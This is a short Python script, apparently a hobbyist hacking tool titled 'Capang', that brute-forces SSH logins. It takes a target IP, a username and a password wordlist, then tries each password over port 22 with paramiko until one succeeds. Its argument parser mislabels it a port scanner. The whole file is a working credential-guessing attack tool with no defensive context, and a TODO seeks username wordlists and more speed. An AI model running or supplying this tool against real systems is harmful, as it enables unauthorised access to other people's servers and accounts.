import paramiko
import os
import argparse
from signal import signal, SIGINT
# TODO: Username wordlist instead of specifying one
#       improve speed 

def handler(signal_received, frame):
    # Handle any cleanup here
    print('\n...............Exiting gracefully')
    front()
    exit(0)

def front():
    # Molek sikit
    print('_________     _____ __________  _____    _______    ________ ')
    print('\\_   ___ \\   /  _  \\______   \\/  _  \\   \\      \\  /  _____/') 
    print('/    \\  \\/  /  /_\\  \\|     ___/  /_\\  \\  /   |   \\/   \\  ___ ')
    print('\\     \\____/    |    \\    |  /    |    \\/    |    \\    \\_\\  ')
    print(' \\______  /\\____|__  /____|  \\____|__  /\\____|__  /\\______  /')
    print('        \\/         \\/                \\/         \\/        \\/ ')

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

if __name__ == '__main__':
    # argument setup
    parser = argparse.ArgumentParser("Capang Port Scanner")
    parser.add_argument("-t", "--target", help="Specify target IP", required=True)
    parser.add_argument("-u", "--username", help="Specify target username", required=True)
    parser.add_argument("-p", "--password", help="Specify password wordlist", required=True)
    args = parser.parse_args()

    # arg parsing
    target = args.target
    username = args.username
    password_file = args.password

    front()
    signal(SIGINT, handler)

    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            
            try:
                response = ssh_connect(password)

                if response == 0:
                    print('Password found: ' + password)
                    exit(0)
                elif response == 1: 
                    print('No luck')
            except Exception as e:
                print(e)